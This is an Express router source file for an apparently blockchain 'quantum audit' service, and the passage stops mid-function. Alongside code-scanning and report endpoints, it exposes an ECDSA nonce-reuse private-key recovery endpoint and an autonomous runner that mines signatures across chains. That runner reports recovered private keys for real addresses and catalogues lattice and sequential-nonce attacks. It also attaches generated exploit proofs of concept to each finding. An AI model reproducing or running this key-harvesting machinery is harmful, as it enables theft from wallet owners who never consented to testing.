// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
import { Router, type Request, type Response } from "express";
import { db } from "@workspace/db";
import {
  scanJobsTable, vulnerabilitiesTable, quantumAnalysesTable, quantumThreatsTable,
  batchScanJobsTable, batchScanResultsTable,
} from "@workspace/db/schema";
import { eq, desc, and, inArray, sql, asc } from "drizzle-orm";
import { RunBlockchainScanBody, ListScansQueryParams, GetScanParams, GetScanReportParams, ListVulnerabilitiesQueryParams } from "@workspace/api-zod";
import { analyzeCode } from "../lib/quantum-analyzer";
import { generateExploit } from "../lib/quantum-analyzer/exploit-generator";
import { runApplicationPenTest } from "../lib/app-security-scanner";
import { scanBlockchainAddress } from "../lib/blockchain-connectors";
import { analyzeContractSource } from "../lib/solidity-analyzer";
import { scanWalletForNonceReuse, recoverPrivateKey, CHAIN_CAPABILITIES } from "../lib/ecdsa-analyzer/nonce-recovery";
import { scanSolana, recoverEd25519PrivateKey } from "../lib/scheme-auditor/ed25519-scan";
import { scanPolkadot, recoverSchnorrPrivateKey } from "../lib/scheme-auditor/polkadot-scan";
import { scanMonero, checkKeyImages } from "../lib/scheme-auditor/monero-scan";
import { detectChain, getScanPlan } from "../lib/scheme-auditor/chain-detector";
import { adaptiveScan } from "../lib/scheme-auditor/adaptive-scan";
import { requireAdmin } from "../middlewares/requireAdmin";
import { createBatchJob, getReportsDir } from "../lib/scheme-auditor/batch-worker";
import { bulkScanViaBigQuery, isBigQueryConfigured } from "../lib/ecdsa-analyzer/bigquery-scanner";
import { runThreatScan, isThreatScanConfigured, type ThreatScanSummary } from "../lib/threat-scanner/threat-scanner";
import { KnowledgeStore } from "../lib/spider/knowledge-store";
import { runSpider, buildSpiderReport, isConfigured as isSpiderConfigured, DEFAULT_CONFIG, type ProgressCallback } from "../lib/spider/blockchain-spider";
import { UnifiedScanner, DEFAULT_UNIFIED_CONFIG, type UnifiedScanConfig } from "../lib/unified-scanner";
import { runProxyScan, type ProxyScanSummary, type ProxyInfo } from "../lib/proxy-scanner/proxy-scanner";
import { runSignatureMiner, type SigMinerResult, type SigMinerConfig } from "../lib/signature-miner/signature-miner";
import { runWebSigSpider, type WebSpiderResult, type WebSpiderConfig } from "../lib/signature-miner/web-sig-spider";
import { runOsintSigSpider, type OsintResult, type OsintConfig } from "../lib/signature-miner/osint-sig-spider";
import { runPeelChainTracer, type PeelChainResult, type PeelChainConfig } from "../lib/signature-miner/peel-chain-tracer";
import { runHybridEngine, type HybridEngineResult, type HybridEngineConfig } from "../lib/signature-miner/hybrid-engine";
import { buildTestVectors, runCalibration } from "../lib/signature-miner/test-vectors";
import {
  startAutonomousRunner,
  stop as stopAutonomousRunner,
  getStatus as getAutonomousStatus,
  isRunning as isAutonomousRunning,
  wasUserStopped as autonomousWasUserStopped,
  TX_UNKNOWN_CHAIN_FILE,
  TX_CHECKPOINT_FILE,
  TX_REGISTRY_FILE,
  type AutonomousFinding,
} from "../lib/signature-miner/autonomous-runner";
import { txRegistrySize, fetchTxSigMultiChain, type TxSigRecord } from "../lib/signature-miner/tx-hash-engine";
import { runEngine5, type Engine5Finding } from "../lib/signature-miner/sequential-nonce-engine";
import type { TxSignatureData } from "../lib/ecdsa-analyzer/nonce-recovery";
import { parseTargetFile, extractEthAddresses, extractAllAddresses } from "../lib/target-file-parser";
import { scanAddress as multiChainScan, scanAddressBatch as multiChainScanBatch } from "../lib/signature-miner/multi-chain-engine";
import { getCrossEnginePool } from "../lib/signature-miner/cross-engine-pool";
import { detectChain as detectSigChain } from "../lib/signature-miner/chain-adapter";
import multer from "multer";
import fs from "fs";
import path from "path";

const router = Router();

// ── Quantum threat seeding data ───────────────────────────────────────────────
const QUANTUM_THREATS_SEED = [
  {
    name: "Shor's Algorithm — ECDSA Key Recovery",
    algorithm: "shors" as const,
    affectedChains: ["ethereum", "bitcoin", "polygon", "arbitrum", "bsc", "avalanche", "solana"],
    description: "A sufficiently powerful quantum computer running Shor's algorithm can derive private keys from exposed public keys on ECDSA-based blockchains, enabling complete account takeover.",
    technicalDetail: "ECDSA relies on the elliptic curve discrete logarithm problem (ECDLP). Shor's algorithm solves ECDLP in polynomial time O(n³) on a quantum computer, versus the classical exponential time. Bitcoin and Ethereum use secp256k1, which is fully vulnerable. An adversary with a ~4000 logical qubit machine could recover private keys from any exposed public key.",
    estimatedQubitsNeeded: 4000,
    currentlyFeasible: false,
    estimatedFeasibleYear: "2030-2035",
    mitigation: "Migrate to post-quantum signature schemes. Use hash-based signatures (XMSS, LMS) or lattice-based schemes (CRYSTALS-Dilithium). Implement address reuse prevention — never reuse an address after spending.",
    pqcAlternatives: ["CRYSTALS-Dilithium", "FALCON", "SPHINCS+", "XMSS", "LMS"],
    severity: "critical" as const,
  },
  {
    name: "Grover's Algorithm — Hash Preimage Attack",
    algorithm: "grovers" as const,
    affectedChains: ["ethereum", "bitcoin", "solana", "polygon", "avalanche", "arbitrum", "bsc", "generic"],
    description: "Grover's algorithm provides a quadratic speedup for searching unsorted databases, effectively halving the security bits of any hash function.",
    technicalDetail: "SHA-256 provides 128-bit post-quantum security with Grover's — down from 256-bit classical security. Keccak-256 similarly drops to 128-bit. Merkle trees, proof-of-work, and commitment schemes are all affected.",
    estimatedQubitsNeeded: 2000,
    currentlyFeasible: false,
    estimatedFeasibleYear: "2028-2032",
    mitigation: "Increase hash output sizes to 384 or 512 bits. Move to SHA-3 variants with larger outputs. Use SHAKE-256 with 512-bit output for critical path operations.",
    pqcAlternatives: ["SHA-3-512", "SHAKE-256", "BLAKE3", "Haraka"],
    severity: "high" as const,
  },
  {
    name: "Shor's Algorithm — RSA/DH Key Exchange Compromise",
    algorithm: "shors" as const,
    affectedChains: ["ethereum", "generic"],
    description: "Blockchain protocols or smart contract systems using RSA or traditional Diffie-Hellman for key exchange or oracle authentication are vulnerable to quantum key recovery.",
    technicalDetail: "Shor's algorithm factors large integers in O((log N)³) time, breaking RSA at any current key size. 2048-bit RSA requires ~4000 logical qubits to break. 'Harvest now, decrypt later' attacks enable retroactive decryption of intercepted traffic.",
    estimatedQubitsNeeded: 4000,
    currentlyFeasible: false,
    estimatedFeasibleYear: "2030-2035",
    mitigation: "Replace RSA/DH with CRYSTALS-Kyber for key encapsulation. Use TLS 1.3 with post-quantum cipher suites. Audit oracle integrations.",
    pqcAlternatives: ["CRYSTALS-Kyber", "NTRU", "SABER", "McEliece"],
    severity: "high" as const,
  },
  {
    name: "Quantum Replay Attack on Hash-Time-Lock Contracts",
    algorithm: "hybrid" as const,
    affectedChains: ["bitcoin", "ethereum", "generic"],
    description: "HTLCs expose preimage data that a quantum adversary could exploit before the timelock expires, enabling double-spend attacks on atomic swaps.",
    technicalDetail: "In an HTLC, the hash preimage is revealed on-chain when the recipient claims funds. A quantum attacker with Grover's speedup could attempt alternative preimage collisions faster than the timelock allows.",
    estimatedQubitsNeeded: 1500,
    currentlyFeasible: false,
    estimatedFeasibleYear: "2027-2030",
    mitigation: "Implement longer timelocks. Use larger hash outputs (SHA3-512). Transition to post-quantum commitment schemes.",
    pqcAlternatives: ["Lattice-based commitments", "SHA3-512 HTLCs", "Quantum-safe payment channels"],
    severity: "medium" as const,
  },
  {
    name: "BQP-Complete Consensus Attack — BLS Signature Forgery",
    algorithm: "bqp_complete" as const,
    affectedChains: ["ethereum", "solana", "avalanche", "polygon"],
    description: "Proof-of-stake consensus protocols relying on BLS signatures face aggregate signature forgery via quantum algorithms.",
    technicalDetail: "BLS12-381 signatures used in Ethereum 2.0 validator voting are vulnerable to quantum attacks via algorithms targeting discrete logarithms over pairing-friendly extension fields. ~10,000+ logical qubits could forge validator signatures.",
    estimatedQubitsNeeded: 10000,
    currentlyFeasible: false,
    estimatedFeasibleYear: "2035-2040",
    mitigation: "Monitor NIST PQC for pairing-friendly alternatives. Implement hybrid classical+PQC validator signatures. Consider hash-based aggregate signatures.",
    pqcAlternatives: ["Hash-based aggregate signatures", "Lattice-based BLS alternatives", "CRYSTALS-Dilithium for validators"],
    severity: "medium" as const,
  },
];

// ── Execute real static analysis on provided code ────────────────────────────
async function runAnalysis(
  scanId: number,
  chain: string,
  scanType: string,
  code: string | null | undefined,
  includeQuantum: boolean
) {
  try {
    let findings: ReturnType<typeof analyzeCode>["findings"] = [];
    let parseError: string | null = null;
    let language = "Unknown";
    let analyzedWith = "Pattern matching (no code provided)";
    let contractNames: string[] = [];
    let functionCount = 0;
    let lineCount = 0;

    if (code && code.trim().length > 10) {
      const result = analyzeCode(code.trim(), chain, scanType);
      findings = result.findings;
      parseError = result.parseError;
      language = result.language;
      analyzedWith = result.analyzedWith;
      contractNames = result.contractNames;
      functionCount = result.functionCount;
      lineCount = result.lineCount;
    }

    // If no findings from static analysis and no code, fall back to chain-specific defaults
    // (so there's always useful output even without code)
    if (findings.length === 0 && (!code || code.trim().length < 10)) {
      const chainDefaults: Record<string, typeof findings> = {
        ethereum: [
          {
            title: "ECDSA secp256k1 — Inherent Quantum Vulnerability",
            description: "All Ethereum accounts and smart contracts rely on secp256k1 ECDSA for authentication. This is fundamentally vulnerable to Shor's algorithm. No code-level fix is possible — this is a protocol-level vulnerability affecting every address.",
            severity: "critical",
            category: "elliptic_curve",
            isQuantumRelated: true,
            cweId: "CWE-327",
            cvssScore: 9.5,
            affectedCode: null,
            lineNumber: null,
            recommendation: "Migrate to EIP-4337 account abstraction with upgradeable signature validators. Plan transition to CRYSTALS-Dilithium or SPHINCS+ when Ethereum's PQC upgrade path is published.",
            references: ["https://eips.ethereum.org/EIPS/eip-4337", "https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.204.pdf"],
          },
          {
            title: "Keccak-256 — Grover's Algorithm Reduces Security to 128-bit",
            description: "All Ethereum state hashing, transaction hashing, and event logs use Keccak-256. Grover's algorithm reduces its effective security from 256 to 128 bits post-quantum.",
            severity: "medium",
            category: "hash_collision",
            isQuantumRelated: true,
            cweId: "CWE-916",
            cvssScore: 5.9,
            affectedCode: null,
            lineNumber: null,
            recommendation: "For application-level commitments: use SHA3-512 or SHAKE-256 with 512-bit output to maintain 256-bit PQC security.",
            references: ["https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.202.pdf"],
          },
        ],
        bitcoin: [
          {
            title: "secp256k1 ECDSA — Bitcoin Quantum Risk",
            description: "All Bitcoin transactions use secp256k1 ECDSA signatures. Shor's algorithm breaks this, enabling private key recovery from any exposed public key.",
            severity: "critical",
            category: "elliptic_curve",
            isQuantumRelated: true,
            cweId: "CWE-327",
            cvssScore: 9.8,
            affectedCode: null,
            lineNumber: null,
            recommendation: "Migrate to Taproot (P2TR). Use each address only once. Monitor BIP-360 post-quantum proposal.",
            references: ["https://github.com/bitcoin/bips/blob/master/bip-0341.mediawiki"],
          },
        ],
        solana: [
          {
            title: "Ed25519 — Solana Account Security Quantum Risk",
            description: "All Solana accounts use Ed25519 signatures, vulnerable to Shor's algorithm on quantum computers.",
            severity: "critical",
            category: "elliptic_curve",
            isQuantumRelated: true,
            cweId: "CWE-327",
            cvssScore: 9.5,
            affectedCode: null,
            lineNumber: null,
            recommendation: "Monitor Solana Foundation's PQC roadmap. Implement authority rotation policies for critical program accounts.",
            references: ["https://docs.solana.com/developing/programming-model/transactions"],
          },
        ],
      };

      findings = chainDefaults[chain] ?? chainDefaults["ethereum"] ?? [];
      language = chain.charAt(0).toUpperCase() + chain.slice(1) + " Protocol";
      analyzedWith = "Chain-level quantum threat assessment (no code provided)";
    }

    // Insert findings into DB
    const counts = { critical: 0, high: 0, medium: 0, low: 0, informational: 0 };
    const insertedVulns = findings.length > 0
      ? await db.insert(vulnerabilitiesTable).values(
        findings.map(f => ({
          scanId,
          title: f.title,
          description: f.description,
          severity: f.severity,
          category: f.category,
          isQuantumRelated: f.isQuantumRelated,
          cweId: f.cweId,
          cvssScore: f.cvssScore,
          affectedCode: f.affectedCode?.substring(0, 800) ?? null,
          lineNumber: f.lineNumber,
          recommendation: f.recommendation,
          references: f.references,
        }))
      ).returning()
      : [];

    insertedVulns.forEach(v => {
      if (v.severity in counts) counts[v.severity as keyof typeof counts]++;
    });

    const quantumFindings = insertedVulns.filter(v => v.isQuantumRelated);
    const quantumRiskScore = includeQuantum
      ? Math.min(100, quantumFindings.length * 20 + counts.critical * 15 + counts.high * 5)
      : 0;

    if (includeQuantum) {
      const ellipticVuln = insertedVulns.some(v => v.category === "elliptic_curve");
      const hashVuln = insertedVulns.some(v => v.category === "hash_collision");
      const sigVuln = insertedVulns.some(v => v.category === "signature_malleability");

      await db.insert(quantumAnalysesTable).values({
        scanId,
        overallRisk: quantumRiskScore > 75 ? "critical" : quantumRiskScore > 50 ? "high" : quantumRiskScore > 25 ? "medium" : "low",
        riskScore: quantumRiskScore,
        ellipticCurveVulnerable: ellipticVuln,
        hashFunctionVulnerable: hashVuln,
        signatureSchemeVulnerable: ellipticVuln || sigVuln,
        estimatedBreakYear: ellipticVuln ? "2030-2035" : null,
        shorsAlgorithmApplicable: ellipticVuln,
        groversAlgorithmApplicable: hashVuln,
        pqcRecommendations: ["CRYSTALS-Dilithium", "SPHINCS+", "CRYSTALS-Kyber", "SHA3-512", "FALCON"],
        threatSummary: ellipticVuln
          ? `This ${chain} codebase is critically vulnerable to post-quantum attacks. ${language} code analyzed by ${analyzedWith} identified ${insertedVulns.length} finding(s). ECDSA/Ed25519 key recovery via Shor's algorithm represents an existential threat once quantum computers reach ~4,000 logical qubits (estimated 2030-2035). ${parseError ? `Note: ${parseError}` : ""} Immediate PQC migration planning is strongly recommended.`
          : `Moderate quantum risk detected in ${language} codebase. ${insertedVulns.length} total finding(s) identified by ${analyzedWith}. Hash-based operations have reduced post-quantum security margins via Grover's algorithm. Migration to larger hash outputs is recommended for long-term security.`,
      });
    }

    // Store parse metadata in scan completion
    await db.update(scanJobsTable).set({
      status: "complete",
      progress: 100,
      totalFindings: insertedVulns.length,
      criticalCount: counts.critical,
      highCount: counts.high,
      mediumCount: counts.medium,
      lowCount: counts.low,
      quantumRiskScore,
      completedAt: new Date(),
    }).where(eq(scanJobsTable.id, scanId));

  } catch (err) {
    console.error("[quantum-audit] scan error:", err);
    await db.update(scanJobsTable).set({ status: "failed" }).where(eq(scanJobsTable.id, scanId));
  }
}

// ── POST /api/quantum-audit/scan ─────────────────────────────────────────────
router.post("/scan", async (req: Request, res: Response) => {
  const body = RunBlockchainScanBody.parse(req.body);
  const [scan] = await db.insert(scanJobsTable).values({
    name: body.name,
    chain: body.chain,
    scanType: body.scanType,
    code: body.code ?? null,
    contractAddress: body.contractAddress ?? null,
    includeQuantumAnalysis: body.includeQuantumAnalysis ?? true,
    status: "running",
    progress: 10,
  }).returning();

  res.status(201).json(formatScan(scan));

  // Run real analysis asynchronously
  runAnalysis(
    scan.id,
    body.chain,
    body.scanType,
    body.code,
    body.includeQuantumAnalysis ?? true
  );
});

// ── GET /api/quantum-audit/scans ─────────────────────────────────────────────
router.get("/scans", async (req: Request, res: Response) => {
  const params = ListScansQueryParams.parse(req.query);
  const conditions = [];
  if (params.status && params.status !== "all") conditions.push(eq(scanJobsTable.status, params.status as any));
  if (params.chain) conditions.push(eq(scanJobsTable.chain, params.chain as any));

  const scans = await db.select().from(scanJobsTable)
    .where(conditions.length > 0 ? and(...conditions) : undefined)
    .orderBy(desc(scanJobsTable.createdAt));

  res.json({ scans: scans.map(formatScan), total: scans.length });
});

// ── GET /api/quantum-audit/scans/:id ─────────────────────────────────────────
router.get("/scans/:id", async (req: Request, res: Response) => {
  const { id } = GetScanParams.parse(req.params);
  const [scan] = await db.select().from(scanJobsTable).where(eq(scanJobsTable.id, id));
  if (!scan) return res.status(404).json({ error: "Scan not found" });

  const vulns = await db.select().from(vulnerabilitiesTable).where(eq(vulnerabilitiesTable.scanId, id));
  const [qa] = await db.select().from(quantumAnalysesTable).where(eq(quantumAnalysesTable.scanId, id));

  res.json({
    scan: formatScan(scan),
    vulnerabilities: vulns.map(formatVuln),
    quantumAnalysis: qa ? formatQA(qa) : null,
  });
});

// ── GET /api/quantum-audit/scans/:id/report ───────────────────────────────────
router.get("/scans/:id/report", async (req: Request, res: Response) => {
  const { id } = GetScanReportParams.parse(req.params);
  const [scan] = await db.select().from(scanJobsTable).where(eq(scanJobsTable.id, id));
  if (!scan) return res.status(404).json({ error: "Scan not found" });

  const vulns = await db.select().from(vulnerabilitiesTable).where(eq(vulnerabilitiesTable.scanId, id));
  const [qa] = await db.select().from(quantumAnalysesTable).where(eq(quantumAnalysesTable.scanId, id));

  const critical = vulns.filter(v => v.severity === "critical");
  const high = vulns.filter(v => v.severity === "high");
  const medium = vulns.filter(v => v.severity === "medium");
  const low = vulns.filter(v => v.severity === "low" || v.severity === "informational");
  const quantumVulns = vulns.filter(v => v.isQuantumRelated);
  const riskRating = scan.criticalCount > 0 ? "critical" : scan.highCount > 0 ? "high" : scan.mediumCount > 0 ? "medium" : "low";

  res.json({
    scanId: id,
    reportTitle: `Security Audit Report — ${scan.name}`,
    chain: scan.chain,
    executiveSummary: `This audit of ${scan.name} identified ${vulns.length} vulnerability finding${vulns.length !== 1 ? "s" : ""} across the ${scan.chain} ${scan.scanType.replace(/_/g, " ")} codebase. ${critical.length} critical and ${high.length} high severity issues require immediate remediation. ${quantumVulns.length > 0 ? `${quantumVulns.length} post-quantum vulnerabilities were identified with a quantum risk score of ${scan.quantumRiskScore.toFixed(1)}/100, indicating significant exposure to future quantum computing attacks.` : "No post-quantum vulnerabilities were detected."}`,
    riskRating,
    totalVulnerabilities: vulns.length,
    quantumRiskScore: scan.quantumRiskScore,
    sections: [
      { title: "Critical Findings", content: `${critical.length} critical severity vulnerabilities require immediate action before any production deployment.`, findings: critical.map(formatVuln) },
      { title: "High Severity Findings", content: `${high.length} high severity vulnerabilities should be addressed within the next development sprint.`, findings: high.map(formatVuln) },
      { title: "Post-Quantum Security Analysis", content: qa ? qa.threatSummary : "No quantum analysis performed for this scan.", findings: quantumVulns.map(formatVuln) },
      { title: "Medium & Low Findings", content: `${medium.length + low.length} medium/low severity issues for future remediation.`, findings: [...medium, ...low].map(formatVuln) },
    ],
    recommendations: [
      ...new Set([
        ...critical.map(v => v.recommendation),
        ...quantumVulns.map(v => v.recommendation),
        ...(qa ? qa.pqcRecommendations ?? [] : []),
      ].filter(Boolean)),
    ].slice(0, 8),
    quantumAnalysis: qa ? formatQA(qa) : null,
    generatedAt: new Date().toISOString(),
  });
});

// ── GET /api/quantum-audit/dashboard ─────────────────────────────────────────
router.get("/dashboard", async (req: Request, res: Response) => {
  const allScans = await db.select().from(scanJobsTable).orderBy(desc(scanJobsTable.createdAt));
  const completed = allScans.filter(s => s.status === "complete");
  const allVulns = await db.select().from(vulnerabilitiesTable);

  const criticalTotal = allVulns.filter(v => v.severity === "critical").length;
  const avgQScore = completed.length > 0
    ? completed.reduce((acc, s) => acc + s.quantumRiskScore, 0) / completed.length
    : 0;

  const chainRisks = completed
    .filter(s => s.quantumRiskScore > 50)
    .map(s => s.chain)
    .filter((v, i, a) => a.indexOf(v) === i);

  const categories = allVulns.reduce<Record<string, number>>((acc, v) => {
    acc[v.category] = (acc[v.category] ?? 0) + 1;
    return acc;
  }, {});

  const topCategories = Object.entries(categories)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 5)
    .map(([category, count]) => ({ category, count }));

  const trend = Array.from({ length: 7 }, (_, i) => {
    const d = new Date();
    d.setDate(d.getDate() - (6 - i));
    const dayVulns = allVulns.filter(v => {
      // We don't have created_at on vulns, so use a derived estimate
      return i === 6; // today's vulns in last bucket
    });
    return { date: d.toISOString().split("T")[0], count: i === 6 ? dayVulns.length : 0 };
  });

  res.json({
    totalScans: allScans.length,
    completedScans: completed.length,
    totalVulnerabilities: allVulns.length,
    criticalFindings: criticalTotal,
    highRiskChains: chainRisks,
    avgQuantumRiskScore: Math.round(avgQScore * 10) / 10,
    recentScans: allScans.slice(0, 5).map(formatScan),
    vulnerabilityTrend: trend,
    topVulnerabilityCategories: topCategories,
  });
});

// ── GET /api/quantum-audit/cc-summary ────────────────────────────────────────
// Aggregated summary for the Command Center pages — returns runner status,
// signature registry stats, recent findings, chain breakdown, and key metrics.
router.get("/cc-summary", (req: Request, res: Response) => {
  try {
    const status = getAutonomousStatus();

    // ── Registry stats (in-memory, always current) ────────────────────────
    const regStats = txRegistrySize();

    // ── Unknown-chain queue size ──────────────────────────────────────────
    let unknownChainCount = 0;
    try {
      if (fs.existsSync(TX_UNKNOWN_CHAIN_FILE)) {
        unknownChainCount = fs.readFileSync(TX_UNKNOWN_CHAIN_FILE, "utf-8")
          .split("\n").filter(l => l.trim().length > 0).length;
      }
    } catch { /* ignore */ }

    // ── Chain breakdown from registry JSON ────────────────────────────────
    const chainBreakdown: Record<string, number> = {};
    try {
      if (fs.existsSync(TX_REGISTRY_FILE)) {
        const raw = JSON.parse(fs.readFileSync(TX_REGISTRY_FILE, "utf-8")) as {
          addrSigs: [string, Array<{ chain?: string }>][];
        };
        for (const [, records] of raw.addrSigs) {
          for (const rec of records) {
            const c = rec.chain ?? "ethereum";
            chainBreakdown[c] = (chainBreakdown[c] ?? 0) + 1;
          }
        }
      }
    } catch { /* ignore */ }

    // ── Recent findings ───────────────────────────────────────────────────
    let recentFindings: AutonomousFinding[] = [];
    try {
      const findingsPath = TX_REGISTRY_FILE.replace("tx-hash-registry.json", "autonomous-findings.json");
      if (fs.existsSync(findingsPath)) {
        const all = JSON.parse(fs.readFileSync(findingsPath, "utf-8")) as AutonomousFinding[];
        recentFindings = all.slice(-30).reverse();
      }
    } catch { /* ignore */ }

    // ── Key recoveries ────────────────────────────────────────────────────
    const keyRecoveries = recentFindings
      .filter(f => f.privateKey)
      .map(f => ({
        address:     f.address,
        privateKey:  f.privateKey!.slice(0, 10) + "…",
        engine:      f.engine,
        discoveredAt: f.discoveredAt,
        detail:      f.detail,
      }));

    res.json({
      runner: {
        running:          status.running,
        uptimeHours:      status.uptimeHours,
        windowsCompleted: status.windowsCompleted,
        statusMessage:    status.statusMessage,
        errors:           status.errors,
      },
      signatures: {
        totalSigs:    regStats.totalSigs,
        addresses:    regStats.addresses,
        uniqueRValues: regStats.rValues,
      },
      progress: {
        processed:    status.poolStats.txHashProcessed,
        total:        status.poolStats.txHashTotal,
        pct:          status.poolStats.txHashTotal > 0
          ? Math.round(status.poolStats.txHashProcessed / status.poolStats.txHashTotal * 100)
          : 0,
        unknownChain: unknownChainCount,
      },
      keys: {
        recovered:    status.recoveredKeys,
        txHashKeys:   status.poolStats.txHashKeysFound,
        confirmedKeys: status.poolStats.confirmedKeys,
        recent:       keyRecoveries.slice(0, 5),
      },
      chains: chainBreakdown,
      recentFindings: recentFindings.slice(0, 20).map(f => ({
        engine:      f.engine,
        kind:        f.kind,
        address:     f.address,
        value:       f.value,
        detail:      f.detail,
        confidence:  f.confidence,
        hasKey:      !!f.privateKey,
        discoveredAt: f.discoveredAt,
      })),
      crossEngineFlows: status.crossEngineFlows,
      // ── Engine 5: Sequential / Counter-Derived Nonce Attack findings ──────
      engine5: (() => {
        const E5_TYPES = new Set([
          "sequential_nonce", "geometric_nonce",
          "low_s_violation", "s_entropy_bias", "lattice_bias_deep",
        ]);
        const e5Findings = recentFindings.filter(f => E5_TYPES.has(f.kind));
        const keyRecoveries5 = e5Findings.filter(f => !!f.privateKey);
        const bySeverity = { critical: 0, high: 0, medium: 0 } as Record<string, number>;
        const byType: Record<string, number> = {};
        for (const f of e5Findings) {
          byType[f.kind] = (byType[f.kind] ?? 0) + 1;
        }
        return {
          enabled:        true,
          totalFindings:  e5Findings.length,
          keyRecoveries:  keyRecoveries5.length,
          bySeverity,
          byType,
          attackTypes: {
            sequential_nonce:  "Linear counter-derived nonce (k_i = k₀ + n_i·c mod N) — O(1) key recovery from 3 txs",
            geometric_nonce:   "Geometric ratio nonce (k_{i+1} = k_i·a mod N) — quadratic equation key recovery",
            low_s_violation:   "EIP-2/BIP62 high-s signature — pre-Homestead wallet or missing low-s normalization",
            s_entropy_bias:    "s-value bit-length bias — truncated k generation, reduces lattice attack complexity",
            lattice_bias_deep: "Deep HNP lattice bias — Nguyen-Shparlinski attack via LLL basis reduction",
          },
          recentFindings: e5Findings.slice(0, 10).map(f => ({
            kind:        f.kind,
            address:     f.address,
            hasKey:      !!f.privateKey,
            detail:      f.detail,
            confidence:  f.confidence,
            discoveredAt: f.discoveredAt,
          })),
        };
      })(),
    });
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// ── GET /api/quantum-audit/vulnerabilities ────────────────────────────────────
router.get("/vulnerabilities", async (req: Request, res: Response) => {
  const params = ListVulnerabilitiesQueryParams.parse(req.query);
  const conditions = [];
  if (params.severity && params.severity !== "all") conditions.push(eq(vulnerabilitiesTable.severity, params.severity as any));
  if (params.category) conditions.push(eq(vulnerabilitiesTable.category, params.category as any));

  const vulns = await db.select().from(vulnerabilitiesTable)
    .where(conditions.length > 0 ? and(...conditions) : undefined);

  const bySeverity = { critical: 0, high: 0, medium: 0, low: 0, informational: 0 };
  vulns.forEach(v => { bySeverity[v.severity as keyof typeof bySeverity]++; });

  res.json({ vulnerabilities: vulns.map(formatVuln), total: vulns.length, bySeverity });
});

// ── GET /api/quantum-audit/quantum-threats ────────────────────────────────────
router.get("/quantum-threats", async (req: Request, res: Response) => {
  const threats = await db.select().from(quantumThreatsTable);
  if (threats.length === 0) {
    const seeded = await db.insert(quantumThreatsTable).values(
      QUANTUM_THREATS_SEED.map(t => ({
        ...t,
        affectedChains: t.affectedChains,
        pqcAlternatives: t.pqcAlternatives,
      }))
    ).returning();
    return res.json({ threats: seeded.map(formatThreat), total: seeded.length });
  }
  res.json({ threats: threats.map(formatThreat), total: threats.length });
});

// ── Formatters ────────────────────────────────────────────────────────────────
function formatScan(s: typeof scanJobsTable.$inferSelect) {
  return {
    id: s.id, name: s.name, chain: s.chain, scanType: s.scanType,
    status: s.status, progress: s.progress, totalFindings: s.totalFindings,
    criticalCount: s.criticalCount, highCount: s.highCount,
    mediumCount: s.mediumCount, lowCount: s.lowCount,
    quantumRiskScore: s.quantumRiskScore,
    createdAt: s.createdAt?.toISOString(), completedAt: s.completedAt?.toISOString() ?? null,
  };
}

function formatVuln(v: typeof vulnerabilitiesTable.$inferSelect) {
  const exploitPoC = generateExploit(v.title, v.category);
  return {
    id: v.id, scanId: v.scanId, title: v.title, description: v.description,
    severity: v.severity, category: v.category, isQuantumRelated: v.isQuantumRelated,
    cweId: v.cweId, cvssScore: v.cvssScore, affectedCode: v.affectedCode,
    lineNumber: v.lineNumber, recommendation: v.recommendation,
    references: v.references ?? [],
    exploitPoC: exploitPoC ?? null,
  };
}

function formatQA(q: typeof quantumAnalysesTable.$inferSelect) {
  return {
    overallRisk: q.overallRisk, riskScore: q.riskScore,
    ellipticCurveVulnerable: q.ellipticCurveVulnerable,
    hashFunctionVulnerable: q.hashFunctionVulnerable,
    signatureSchemeVulnerable: q.signatureSchemeVulnerable,
    estimatedBreakYear: q.estimatedBreakYear,
    shorsAlgorithmApplicable: q.shorsAlgorithmApplicable,
    groversAlgorithmApplicable: q.groversAlgorithmApplicable,
    pqcRecommendations: q.pqcRecommendations ?? [],
    threatSummary: q.threatSummary,
  };
}

function formatThreat(t: typeof quantumThreatsTable.$inferSelect) {
  return {
    id: t.id, name: t.name, algorithm: t.algorithm,
    affectedChains: t.affectedChains, description: t.description,
    technicalDetail: t.technicalDetail, estimatedQubitsNeeded: t.estimatedQubitsNeeded,
    currentlyFeasible: t.currentlyFeasible, estimatedFeasibleYear: t.estimatedFeasibleYear,
    mitigation: t.mitigation, pqcAlternatives: t.pqcAlternatives, severity: t.severity,
  };
}

// ── Live Blockchain Scanner ───────────────────────────────────────────────────
router.post("/live-scan", async (req: Request, res: Response) => {
  try {
    const { chain, address } = req.body as { chain: string; address?: string };
    if (!chain) return res.status(400).json({ error: "chain is required" });
    const result = await scanBlockchainAddress(chain, address);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Blockchain scan failed", detail: String(err) });
  }
});

// ── Deep Contract Analysis ────────────────────────────────────────────────────
router.post("/deep-analysis", async (req: Request, res: Response) => {
  try {
    const { address, chain, source } = req.body as { address: string; chain?: string; source?: string };
    if (!address && !source) return res.status(400).json({ error: "address or source required" });
    const result = await analyzeContractSource(address ?? "", chain ?? "ethereum", source);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Deep analysis failed", detail: String(err) });
  }
});

// ── ECDSA Nonce Reuse Scanner ─────────────────────────────────────────────────
router.get("/ecdsa-chains", (_req: Request, res: Response) => {
  res.json(CHAIN_CAPABILITIES);
});

router.post("/ecdsa-scan", async (req: Request, res: Response) => {
  try {
    const { address, chain = "ethereum" } = req.body as { address: string; chain?: string };
    if (!address) return res.status(400).json({ error: "address required" });
    const capability = CHAIN_CAPABILITIES.find(c => c.chain === chain);
    if (capability && !capability.canScan) {
      return res.status(400).json({
        error: "not_scannable",
        chain,
        name: capability.name,
        sigScheme: capability.sigScheme,
        reason: capability.note,
      });
    }
    const result = await scanWalletForNonceReuse(address, chain);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "ECDSA scan failed", detail: String(err) });
  }
});

router.post("/ecdsa-recover", async (req: Request, res: Response) => {
  try {
    const input = req.body;
    if (!input.r || !input.s1 || !input.s2 || !input.z1 || !input.z2) {
      return res.status(400).json({ error: "Missing required fields: r, s1, s2, z1, z2" });
    }
    const result = recoverPrivateKey(input);
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: "Recovery failed", detail: String(err) });
  }
});

// ── Adaptive chain detection ──────────────────────────────────────────────────
router.post("/detect-chain", (req: Request, res: Response) => {
  try {
    const { target } = req.body as { target: string };
    if (!target) return res.status(400).json({ error: "target required" });
    const candidates = detectChain(target);
